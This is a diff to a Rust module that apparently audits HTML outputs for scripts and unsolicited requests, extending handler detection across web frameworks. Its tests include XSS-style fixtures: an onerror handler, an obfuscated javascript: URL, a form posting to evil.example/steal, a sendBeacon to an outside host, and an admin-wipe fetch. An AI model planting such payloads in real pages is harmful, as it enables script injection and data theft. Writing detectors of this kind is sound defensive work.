@@ -1,17 +1,21 @@
 //! Output labels: what the platform allows in the export's result.
 //!
 //! `html:no-scripts`: no script runs from this markup (no `<script>`, no
-//! event handler, no `javascript:` URL, no `hx-on`). `html:safe`: no
-//! scripts, and the markup makes no request a user didn't ask for to
-//! another host or to a sensitive route (no meta refresh, no form or htmx
-//! action off the app, no request on load). `url:local`: a path on the
-//! app's own host, so `//evil`, `/\evil` and schemes fail.
+//! event handler of any framework, no `javascript:` URL). `html:safe`: no
+//! scripts, and the markup makes no request the user didn't ask for to
+//! another host or to a sensitive route (no meta refresh, no form off the
+//! app, nothing loaded from another host, nothing that fires by itself).
+//! `url:local`: a path on the app's own host, so `//evil`, `/\evil` and
+//! schemes fail.
 //!
-//! The browser model is static: tags and attributes read the way a browser
-//! reads them (entities decoded, case folded). Phase 3 adds obfuscation.
+//! The browser model is static and knows no framework: standard HTML
+//! attributes by their meaning, every other attribute by the shape of its
+//! value (see `urls::in_html`). Names that look like handlers (`on…`,
+//! `@…`, `…on:…`, `(…)`) count as handlers.
 
-use std::collections::BTreeMap;
+use std::sync::LazyLock;
 
+use regex::Regex;
 use serde::{Deserialize, Serialize};
 use serde_json::{Value, json};
 
@@ -19,7 +23,7 @@ use crate::detect::{Finding, Severity};
 use crate::harness::field;
 use crate::manifest::Manifest;
 use crate::record::{OutcomeKind, RunRecord};
-use crate::urls::{ATTR, TAG, classify, normalize};
+use crate::urls::{classify, elements, in_html, normalize};
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 pub enum OutputLabel {
@@ -41,70 +45,72 @@ impl OutputLabel {
     }
 }
 
-/// Attributes that hold a URL a browser loads or navigates to.
-const URL_ATTRS: &[&str] = &["href", "src", "action", "formaction", "xlink:href", "data", "poster", "background", "srcset"];
 /// Tags that run or embed active content.
 const ACTIVE_TAGS: &[&str] = &["script", "object", "embed", "applet"];
-/// htmx triggers that fire without the user doing anything.
-const SELF_TRIGGERS: &[&str] = &["load", "revealed", "intersect", "every"];
+/// Attributes whose value is text for people, never code.
+const TEXT_ATTRS: &[&str] = &["class", "id", "title", "alt", "name", "type", "value", "placeholder", "content", "label", "lang", "style", "role", "for"];
+/// A call (`f(…)`, `a.b(…)`), an arrow function, or a `js:` prefix.
+static CODE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)^\s*js:|[A-Za-z_$][\w$.]*\s*\([^)]*\)|=>").unwrap());
 
-/// One element as the browser sees it.
-struct Tag {
-    name: String,
-    attrs: BTreeMap<String, String>,
-    raw: String,
+/// Something found in the markup: what, the tag, how bad.
+#[derive(Debug, Clone)]
+pub struct Hit {
+    pub what: String,
+    pub tag: String,
+    pub severity: Severity,
 }
 
-fn tags(html: &str) -> Vec<Tag> {
-    TAG.captures_iter(html)
-        .map(|t| {
-            let mut attrs = BTreeMap::new();
-            for a in ATTR.captures_iter(&t[2]) {
-                let k = a[1].to_ascii_lowercase();
-                let v = a.get(2).or(a.get(3)).or(a.get(4)).map(|m| m.as_str()).unwrap_or_default();
-                attrs.entry(k).or_insert_with(|| normalize(v));
-            }
-            let raw: String = t[0].chars().take(160).collect();
-            Tag { name: t[1].to_ascii_lowercase(), attrs, raw }
-        })
-        .collect()
+fn hit(what: String, tag: &str, severity: Severity) -> Hit {
+    Hit { what, tag: tag.to_string(), severity }
 }
 
-/// Ways the markup can run a script: (what, the tag).
-pub fn scripts(html: &str) -> Vec<(String, String)> {
+/// Whether an attribute name looks like an event handler in some
+/// framework: `onclick`, `@click`, `x-on:click`, `hx-on::after`,
+/// `v-on:click`, `(click)`, `data-on-click`.
+fn is_handler(k: &str) -> bool {
+    let k = k.strip_prefix("data-").unwrap_or(k);
+    if k.starts_with('@') || k.starts_with('(') {
+        return true;
+    }
+    if k.len() > 2 && k.starts_with("on") && k[2..].chars().all(|c| c.is_ascii_alphabetic()) {
+        return true;
+    }
+    let w: Vec<&str> = k.split(['-', ':', '.', '_']).collect();
+    w.iter().enumerate().any(|(i, x)| *x == "on" && i + 1 < w.len())
+}
+
+/// Ways the markup can run a script.
+pub fn scripts(html: &str) -> Vec<Hit> {
     let mut out = Vec::new();
-    for t in tags(html) {
+    for t in elements(html) {
         if ACTIVE_TAGS.contains(&t.name.as_str()) {
-            out.push((format!("a <{}> element", t.name), t.raw.clone()));
+            out.push(hit(format!("a <{}> element", t.name), &t.raw, Severity::Fail));
             continue;
         }
-        if t.name == "iframe" && t.attrs.contains_key("srcdoc") {
-            out.push(("an iframe with srcdoc".into(), t.raw.clone()));
+        if t.name == "iframe" && t.get("srcdoc").is_some() {
+            out.push(hit("an iframe with srcdoc".into(), &t.raw, Severity::Fail));
         }
         for (k, v) in &t.attrs {
-            let k = k.strip_prefix("data-").unwrap_or(k);
-            if k.starts_with("on") && k.len() > 2 {
-                out.push((format!("an event handler ({k})"), t.raw.clone()));
-            } else if k.starts_with("hx-on") {
-                out.push((format!("an htmx handler ({k})"), t.raw.clone()));
-            } else if k == "hx-vars" || k == "hx-vals" && (v.trim_start().starts_with("js:") || v.trim_start().starts_with("javascript:")) {
-                out.push((format!("script in {k}"), t.raw.clone()));
-            } else if (URL_ATTRS.contains(&k) || k.starts_with("hx-") && is_hx_request(k)) && script_url(v) {
-                out.push((format!("a script URL in {k}"), t.raw.clone()));
-            } else if k == "content"
-                && t.attrs.get("http-equiv").is_some_and(|h| h.eq_ignore_ascii_case("refresh"))
-                && let Some(i) = v.to_ascii_lowercase().find("url=")
-                && script_url(&v[i + 4..])
-            {
-                out.push(("a meta refresh to a script URL".into(), t.raw.clone()));
+            let v = normalize(v);
+            if is_handler(k) {
+                out.push(hit(format!("an event handler ({k})"), &t.raw, Severity::Fail));
+            } else if k == "content" && t.get("http-equiv").is_some_and(|h| h.eq_ignore_ascii_case("refresh")) {
+                if let Some(i) = v.to_ascii_lowercase().find("url=")
+                    && script_url(&v[i + 4..])
+                {
+                    out.push(hit("a meta refresh to a script URL".into(), &t.raw, Severity::Fail));
+                }
+            } else if script_url(&v) {
+                out.push(hit(format!("a script URL in {k}"), &t.raw, Severity::Fail));
+            } else if v.trim_start().to_ascii_lowercase().starts_with("js:") {
+                out.push(hit(format!("script in {k}"), &t.raw, Severity::Fail));
+            } else if !TEXT_ATTRS.contains(&k.as_str()) && !k.starts_with("aria-") && CODE.is_match(&v) {
+                // A framework may run it.
+                out.push(hit(format!("an attribute that looks like code ({k})"), &t.raw, Severity::Warn));
             }
         }
     }
     out
-}
-
-fn is_hx_request(k: &str) -> bool {
-    matches!(k, "hx-get" | "hx-post" | "hx-put" | "hx-patch" | "hx-delete")
 }
 
 fn script_url(v: &str) -> bool {
@@ -114,35 +120,49 @@ fn script_url(v: &str) -> bool {
 }
 
 /// Requests the markup makes that the user didn't ask for, or makes to
-/// another host or a sensitive route: (what, the tag).
-pub fn unsafe_actions(html: &str, sensitive: &[String]) -> Vec<(String, String)> {
+/// another host or a sensitive route.
+pub fn unsafe_actions(html: &str, sensitive: &[String]) -> Vec<Hit> {
     let mut out = Vec::new();
     let is_sensitive = |u: &str| {
         let path = u.split(['?', '#']).next().unwrap_or(u);
         sensitive.iter().find(|s| path == s.as_str() || path.starts_with(&format!("{}/", s.trim_end_matches('/'))))
     };
-    for t in tags(html) {
-        if t.name == "meta" && t.attrs.get("http-equiv").is_some_and(|h| h.eq_ignore_ascii_case("refresh")) {
-            out.push(("a meta refresh (the page moves on by itself)".into(), t.raw.clone()));
+    for t in elements(html) {
+        if t.name == "meta" && t.get("http-equiv").is_some_and(|h| h.eq_ignore_ascii_case("refresh")) {
+            out.push(hit("a meta refresh (the page moves on by itself)".into(), &t.raw, Severity::Fail));
         }
-        let trigger = t.attrs.get("hx-trigger").map(|x| x.to_ascii_lowercase()).unwrap_or_default();
-        let by_itself = trigger.split([',', ' ']).any(|w| SELF_TRIGGERS.iter().any(|s| w.starts_with(s)));
-        for (k, v) in &t.attrs {
-            let k = k.strip_prefix("data-").unwrap_or(k);
-            let action = match k {
-                "action" | "formaction" => Some("a form"),
-                k if is_hx_request(k) => Some("an htmx request"),
-                _ => None,
-            };
-            let Some(what) = action else { continue };
-            let kind = classify(v).0;
-            if kind != "same_host" {
-                out.push((format!("{what} to {} ({k}, {kind})", v.chars().take(80).collect::<String>()), t.raw.clone()));
-            } else if let Some(s) = is_sensitive(v) {
-                out.push((format!("{what} to the sensitive route {s} ({k} = {v})"), t.raw.clone()));
-            } else if what == "an htmx request" && by_itself {
-                out.push((format!("an htmx request that fires by itself ({k} = {v}, hx-trigger = {trigger})"), t.raw.clone()));
-            }
+    }
+    // A URL joined from pieces counts only where the element shows nothing
+    // else: pieces join into noise too.
+    let mut shown: Vec<String> = Vec::new();
+    for f in in_html(html) {
+        if f.source == "joined" && shown.contains(&f.tag) {
+            continue;
+        }
+        let before = out.len();
+        let u = normalize(&f.url);
+        let kind = classify(&u).0;
+        if matches!(kind.as_str(), "javascript" | "data" | "mailto") {
+            continue;
+        }
+        let short: String = u.chars().take(80).collect();
+        let (k, off) = (&f.source, kind != "same_host");
+        let what = match f.trigger.as_str() {
+            "form" => "a form",
+            "load" => "a load",
+            "unknown" | "auto" => "a request in an attribute of no standard meaning",
+            // Links are the user's choice; refresh is reported above.
+            _ => continue,
+        };
+        if off {
+            out.push(hit(format!("{what} to {short} ({k}, {kind})"), &f.tag, Severity::Fail));
+        } else if let Some(s) = is_sensitive(&u) {
+            out.push(hit(format!("{what} to the sensitive route {s} ({k} = {short})"), &f.tag, Severity::Fail));
+        } else if f.trigger == "auto" {
+            out.push(hit(format!("a request that fires by itself ({k} = {short})"), &f.tag, Severity::Fail));
+        }
+        if out.len() > before {
+            shown.push(f.tag.clone());
         }
     }
     out
@@ -170,11 +190,11 @@ pub fn check(r: &RunRecord, m: &Manifest) -> Vec<Finding> {
         let from_req = |s: &str| req.iter().find(|q| s.contains(q.as_str())).cloned();
         match label {
             OutputLabel::HtmlNoScripts | OutputLabel::HtmlSafe => {
-                for (what, tag) in scripts(v) {
+                for Hit { what, tag, severity } in scripts(v) {
                     out.push(Finding::new(
                         "script_in_output",
                         &format!("{ex}\0{path}\0{}", what.split(' ').take(3).collect::<Vec<_>>().join(" ")),
-                        Severity::Fail,
+                        severity,
                         format!(
                             "{path} is labelled {} but holds {what}{}",
                             label.name(),
@@ -185,11 +205,11 @@ pub fn check(r: &RunRecord, m: &Manifest) -> Vec<Finding> {
                     ));
                 }
                 if *label == OutputLabel::HtmlSafe {
-                    for (what, tag) in unsafe_actions(v, &entry.sensitive_paths) {
+                    for Hit { what, tag, severity } in unsafe_actions(v, &entry.sensitive_paths) {
                         out.push(Finding::new(
                             "unsafe_action",
                             &format!("{ex}\0{path}\0{}", what.split(' ').take(4).collect::<Vec<_>>().join(" ")),
-                            Severity::Fail,
+                            severity,
                             format!("{path} is labelled html:safe but holds {what}"),
                             json!({"path": path, "label": label.name(), "what": what, "tag": tag, "from_request": from_req(&tag)}),
                             run,
@@ -238,8 +258,8 @@ fn request_texts(r: &RunRecord) -> Vec<String> {
 mod tests {
     use super::*;
 
-    fn whats(v: Vec<(String, String)>) -> Vec<String> {
-        v.into_iter().map(|(w, _)| w).collect()
+    fn whats(v: Vec<Hit>) -> Vec<String> {
+        v.into_iter().map(|h| h.what).collect()
     }
 
     #[test]
@@ -248,22 +268,37 @@ mod tests {
         assert_eq!(whats(scripts("<SCRIPT>alert(1)</SCRIPT>")), ["a <script> element"]);
         assert_eq!(whats(scripts("<img src=x OnError=alert(1)>")), ["an event handler (onerror)"]);
         assert_eq!(whats(scripts("<a href=\"jav&#x09;ascript&colon;alert(1)\">x</a>")), ["a script URL in href"]);
-        assert_eq!(whats(scripts("<button hx-on:click=\"alert(1)\">x</button>")), ["an htmx handler (hx-on:click)"]);
+        // Handlers of any framework, by the shape of the name.
+        for h in ["hx-on:click", "x-on:click", "@click", "v-on:submit", "(click)", "data-on-click", "hx-on::after-request"] {
+            assert_eq!(whats(scripts(&format!("<button {h}=\"go()\">x</button>"))), [format!("an event handler ({h})")], "{h}");
+        }
         assert_eq!(whats(scripts("<div hx-vals='js:{a: evil()}'></div>")), ["script in hx-vals"]);
-        assert_eq!(whats(scripts("<div hx-vars='a:evil()'></div>")), ["script in hx-vars"]);
-        assert!(scripts("<div hx-vals='{\"a\": 1}'></div>").is_empty());
+        assert_eq!(whats(scripts("<div data-url=\"javascript:evil()\"></div>")), ["a script URL in data-url"]);
+        // Code-shaped values in other attributes: a framework may run them.
+        let h = scripts("<div x-init=\"fetch('/x')\"></div>");
+        assert_eq!((h[0].what.as_str(), h[0].severity), ("an attribute that looks like code (x-init)", Severity::Warn));
+        assert!(scripts("<div hx-vals='{\"a\": 1}' title=\"call (555) 123\" x-show=\"open\" data-on=\"x\"></div>").is_empty());
     }
 
     #[test]
     fn finds_unsafe_actions() {
         let s = vec!["/admin".to_string()];
-        assert!(unsafe_actions("<form method=post action=\"/order\"><button>x</button></form>", &s).is_empty());
-        assert!(unsafe_actions("<a href=\"https://other.example/\">x</a>", &s).is_empty());
-        assert_eq!(unsafe_actions("<form action=\"https://evil.example/steal\">", &s).len(), 1);
-        assert_eq!(unsafe_actions("<button hx-post=\"/admin/users/7/delete\">x</button>", &s).len(), 1);
-        assert_eq!(unsafe_actions("<div hx-get=\"/feed\" hx-trigger=\"load\"></div>", &s).len(), 1);
-        assert!(unsafe_actions("<div hx-get=\"/feed\" hx-trigger=\"click\"></div>", &s).is_empty());
-        assert_eq!(unsafe_actions("<meta http-equiv=\"refresh\" content=\"0;url=/x\">", &s).len(), 1);
+        let n = |h: &str| unsafe_actions(h, &s).len();
+        assert_eq!(n("<form method=post action=\"/order\"><button>x</button></form>"), 0);
+        assert_eq!(n("<a href=\"https://other.example/\">x</a>"), 0);
+        assert_eq!(n("<form action=\"https://evil.example/steal\">"), 1);
+        assert_eq!(n("<meta http-equiv=\"refresh\" content=\"0;url=/x\">"), 1);
+        // htmx, Alpine, Turbo, data attributes: one rule.
+        assert_eq!(n("<button hx-post=\"/admin/users/7/delete\">x</button>"), 1);
+        assert_eq!(n("<div hx-get=\"/feed\" hx-trigger=\"load\"></div>"), 1);
+        assert_eq!(n("<div hx-get=\"/feed\" hx-trigger=\"click\"></div>"), 0);
+        assert_eq!(n("<div x-init=\"fetch('/admin/wipe')\"></div>"), 1);
+        assert_eq!(n("<div x-intersect=\"$fetch('/feed')\"></div>"), 1);
+        assert_eq!(n("<turbo-frame src=\"https://evil.example/f\"></turbo-frame>"), 1);
+        assert_eq!(n("<img src=\"https://t.example/p.gif\">"), 1);
+        assert_eq!(n("<img src=\"/logo.png\">"), 0);
+        assert_eq!(n("<div data-endpoint=\"/admin/x\"></div>"), 1);
+        assert_eq!(n("<script>navigator.sendBeacon('https://c.example/p')</script>"), 1);
     }
 
     #[test]
